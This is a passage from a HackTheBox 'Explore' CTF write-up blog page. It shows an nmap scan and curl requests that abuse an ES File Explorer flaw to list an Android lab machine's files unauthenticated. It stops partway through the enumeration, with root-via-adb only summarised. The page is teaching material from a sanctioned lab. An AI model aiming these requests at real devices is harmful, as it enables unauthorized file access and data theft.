@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Explore Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Explore.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Explore Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Explore.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-explore/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Explore Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Explore.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-11-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-11-01T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-explore/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-explore/">
+              HTB: Explore Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-11-01T00:00:00Z">
+                November 1, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Explore</p>
+<p>IP Address: 10.10.10.247</p>
+<p>Difficulty: Easy</p>
+<p>Summary: HackTheBox&rsquo;s Explore was my first foray into the world of hacking Android devices, and it was, all things considered, a gentle introduction and a good machine for those who aren&rsquo;t familiar with the android system as the internal enumeration needed to find the path to root requires you to learn about a crucial service used to debug Android programs. The box begins with the discovery of a vulnerability that allows unauthenticated remote users to enumerate the local system and download files. That enumeration eventually leads the user to find a file containing credentials that allow the user to SSH into the system. Once on the local system, running the <code>netstat</code> command leads to the discovery of Android debugger (adb) running on local port <code>5555</code>. By forwarding this port to the remote attacker&rsquo;s machine, only a few commands, all of which are well documented in Android&rsquo;s official documentation for developers, are required to escalate privileges to root.</p>
+<p>Tools Used: Nmap, cURL, ssh, adb</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As always, I began by performing an Nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Nmap 7.91 scan initiated Mon Aug 30 07:29:45 2021 as: nmap -sC -sV -p- -oA nmap 10.10.10.247
+</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"></span>Nmap scan report for 10.10.10.247
+</span></span><span style="display:flex;"><span>Host is up (0.051s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65530 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span>2222/tcp  open     ssh     (protocol 2.0)
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   NULL:
+</span></span><span style="display:flex;"><span>|_    SSH-2.0-SSH Server - Banana Studio
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+</span></span><span style="display:flex;"><span>5555/tcp  filtered freeciv
+</span></span><span style="display:flex;"><span>42135/tcp open     http    ES File Explorer Name Response httpd
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span style="display:flex;"><span>45389/tcp open     unknown
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   GenericLines:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:34:53 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 22
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line:
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 412 Precondition Failed
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:34:53 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 0
+</span></span><span style="display:flex;"><span>|   HTTPOptions:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 501 Not Implemented
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:34:58 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 29
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Method not supported: OPTIONS
+</span></span><span style="display:flex;"><span>|   Help:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:35:13 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 26
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line: HELP
+</span></span><span style="display:flex;"><span>|   RTSPRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:34:58 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 39
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     valid protocol version: RTSP/1.0
+</span></span><span style="display:flex;"><span>|   SSLSessionReq:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Date: Mon, 30 Aug 2021 11:35:13 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: 73
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=US-ASCII
+</span></span><span style="display:flex;"><span>|     Connection: Close
+</span></span><span style="display:flex;"><span>|     Invalid request line:
+</span></span><span style="display:flex;"><span>|     ?G???,???<span style="color:#a5d6ff">`~?
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     ??{????w????&lt;=?o?
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|   TLSSessionReq:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     HTTP/1.0 400 Bad Request
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Date: Mon, 30 Aug 2021 11:35:13 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Content-Length: 71
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Content-Type: text/plain; charset=US-ASCII
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Connection: Close
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Invalid request line:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     ??random1random2random3random4
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|   TerminalServerCookie:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     HTTP/1.0 400 Bad Request
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Date: Mon, 30 Aug 2021 11:35:13 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Content-Length: 54
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Content-Type: text/plain; charset=US-ASCII
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Connection: Close
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|     Invalid request line:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|_    Cookie: mstshash=nmap
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">|_http-title: Site doesn&#39;t have a title (text/plain).
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF-Port2222-TCP:V=7.91%I=7%D=8/30%Time=612CC148%P=x86_64-pc-linux-gnu%r(NU
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:LL,24,&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF-Port45389-TCP:V=7.91%I=7%D=8/30%Time=612CC147%P=x86_64-pc-linux-gnu%r(G
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:enericLines,AA,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:30\x20Aug\x202021\x2011:34:53\x20GMT\r\nContent-Length:\x2022\r\nConten
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:r\nInvalid\x20request\x20line:\x20&#34;)%r(GetRequest,5C,&#34;HTTP/1\.1\x20412\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:x20Precondition\x20Failed\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x2011:3
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:4:53\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(HTTPOptions,B5,&#34;HTTP/1\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:2011:34:58\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:0supported:\x20OPTIONS&#34;)%r(RTSPRequest,BB,&#34;HTTP/1\.0\x20400\x20Bad\x20R
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:equest\r\nDate:\x20Mon,\x2030\x20Aug\x202021\x2011:34:58\x20GMT\r\nCont
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:\x20\x20RTSP/1\.0&#34;)%r(Help,AE,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:te:\x20Mon,\x2030\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&#34;)%r(SSLSessionReq
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:,DD,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2030\x20Aug\x
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:202021\x2011:35:13\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`</span>~\?
+</span></span><span style="display:flex;"><span>SF:\0\?\?{\?\?\?\?w\?\?\?\?<span style="color:#f85149">&lt;</span>=\?o\?\x10n\0\0\(\0\x16\0\x13\0&#34;)%r(TerminalSe
+</span></span><span style="display:flex;"><span>SF:rverCookie,CA,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x203
+</span></span><span style="display:flex;"><span>SF:0\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:\x2054\r\nContent
+</span></span><span style="display:flex;"><span>SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
+</span></span><span style="display:flex;"><span>SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
+</span></span><span style="display:flex;"><span>SF:hash=nmap&#34;)%r(TLSSessionReq,DB,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
+</span></span><span style="display:flex;"><span>SF:ate:\x20Mon,\x2030\x20Aug\x202021\x2011:35:13\x20GMT\r\nContent-Length:
+</span></span><span style="display:flex;"><span>SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
+</span></span><span style="display:flex;"><span>SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
+</span></span><span style="display:flex;"><span>SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&#34;);
+</span></span><span style="display:flex;"><span>Service Info: Device: phone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Nmap done at Mon Aug 30 07:31:50 2021 -- 1 IP address (1 host up) scanned in 124.50 seconds
+</span></span></span></code></pre></div><p>The Nmap scan revealed several open ports, several of which are seemingly designed to lead the user down a rabbit hole. Of all of the things I&rsquo;ve learned, perhaps the most important is to always try to exhaust the low-hanging fruit before going down rabbit holes. Given my relative lack of experience testing Android devices, I had relatively little way to gauge the exploitability of each service exposed to external users. Whereas my initial explorations into most services were fruitless, I managed to find an interesting writeup about the ES Explorer service by <a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566"  class="external-link" target="_blank" rel="noopener">KnownSec</a>. Essentially, a vulnerability in the application identified in 2019 allows remote unauthenticated users to execute a number of commands which allows for system enumeration. None of the commands have any documented code execution mechanisms, but that doesn&rsquo;t mean that valuable information can&rsquo;t be gained just using the available commands and some bash trickery.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore/enum<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl --header <span style="color:#a5d6ff">&#34;Content-Type: application/json&#34;</span> --request POST --data <span style="color:#a5d6ff">&#34;{\&#34;command\&#34;:\&#34;listFiles\&#34;}&#34;</span> http://10.10.10.247:59777 | tee listFiles.out
+</span></span><span style="display:flex;"><span>    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                    Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">100</span>  <span style="color:#a5d6ff">5029</span>  <span style="color:#a5d6ff">100</span>  <span style="color:#a5d6ff">5006</span>  <span style="color:#a5d6ff">100</span>    <span style="color:#a5d6ff">23</span>  <span style="color:#a5d6ff">52694</span>    <span style="color:#a5d6ff">242</span> --:--:-- --:--:-- --:-<span style="color:#ff7b72;font-weight:bold">[</span>:--     <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;lib&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;3/25/20 05:12:02 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;folder&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;12.00 KB (12,288 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vndservice_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;65.00 Bytes (65 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vendor_service_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vendor_seapp_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vendor_property_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;392.00 Bytes (392 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vendor_hwservice_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span><span style="color:#a5d6ff">&#34;name&#34;</span>:<span style="color:#a5d6ff">&#34;vendor_file_contexts&#34;</span>, <span style="color:#a5d6ff">&#34;time&#34;</span>:<span style="color:#a5d6ff">&#34;9/2/21 07:28:53 AM&#34;</span>, <span style="color:#a5d6ff">&#34;type&#34;</span>:<span style="color:#a5d6ff">&#34;file&#34;</span>, <span style="color:#a5d6ff">&#34;size&#34;</span>:<span style="color:#a5d6ff">&#34;6.92 KB (7,081 Bytes)&#34;</span>, <span style="color:#ff7b72;font-weight:bold">}</span>,
+</span></span><span style="display:flex;"><span>…
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore/enum<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat listFiles.out | grep <span style="color:#a5d6ff">&#39;&#34;type&#34;:&#34;file&#34;&#39;</span> | awk -F<span style="color:#a5d6ff">&#39;, &#39;</span> <span style="color:#a5d6ff">&#39;{print $1}&#39;</span> | awk -F<span style="color:#a5d6ff">&#39;:&#39;</span> <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;&#34;&#39;</span> &gt; filenames
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore/enum<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat listFiles.out | grep <span style="color:#a5d6ff">&#39;&#34;type&#34;:&#34;folder&#34;&#39;</span> | awk -F<span style="color:#a5d6ff">&#39;, &#39;</span> <span style="color:#a5d6ff">&#39;{print $1}&#39;</span> | awk -F<span style="color:#a5d6ff">&#39;:&#39;</span> <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;&#34;&#39;</span> &gt; foldernames
+</span></span></code></pre></div><p>In this series of commands, I pulled down all files and folders and created separate lists for files and folders. The folders could be further enumerated using similar commands as those identified above and files could be downloaded using the <code>getFile</code> function of the ES Explorer software. Using some one-liners I was able to efficiently iterate through the subdirectories within the root directory and managed to find some interesting files in the <code>/sdcard</code> directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore/enum<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$  cat foldernames | <span style="color:#ff7b72">while</span> read p; <span style="color:#ff7b72">do</span> echo <span style="color:#a5d6ff">&#34;\n\n</span><span style="color:#79c0ff">$p</span><span style="color:#a5d6ff">\n--&#34;</span>; curl --header <span style="color:#a5d6ff">&#34;Content-Type: application/json&#34;</span> -s --request POST --data <span style="color:#a5d6ff">&#34;{\&#34;command\&#34;:\&#34;listFiles\&#34;}&#34;</span> http://10.10.10.247:59777/<span style="color:#79c0ff">$p</span>/ | awk -F<span style="color:#a5d6ff">&#39;, &#39;</span> <span style="color:#a5d6ff">&#39;{print $1, $3}&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;{&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;&#34;&#39;</span>; <span style="color:#ff7b72">done</span> | tee nested-ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>…
+</span></span><span style="display:flex;"><span>sdcard
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name:Android type:folder
+</span></span><span style="display:flex;"><span>name:.estrongs type:folder
+</span></span><span style="display:flex;"><span>name:Download type:folder
+</span></span><span style="display:flex;"><span>name:dianxinos type:folder
+</span></span><span style="display:flex;"><span>name:Notifications type:folder
+</span></span><span style="display:flex;"><span>name:DCIM type:folder
+</span></span><span style="display:flex;"><span>name:Alarms type:folder
+</span></span><span style="display:flex;"><span>name:Podcasts type:folder
+</span></span><span style="display:flex;"><span>name:Pictures type:folder
+</span></span><span style="display:flex;"><span>name:.userReturn type:file
+</span></span><span style="display:flex;"><span>name:user.txt type:file
+</span></span><span style="display:flex;"><span>name:Movies type:folder
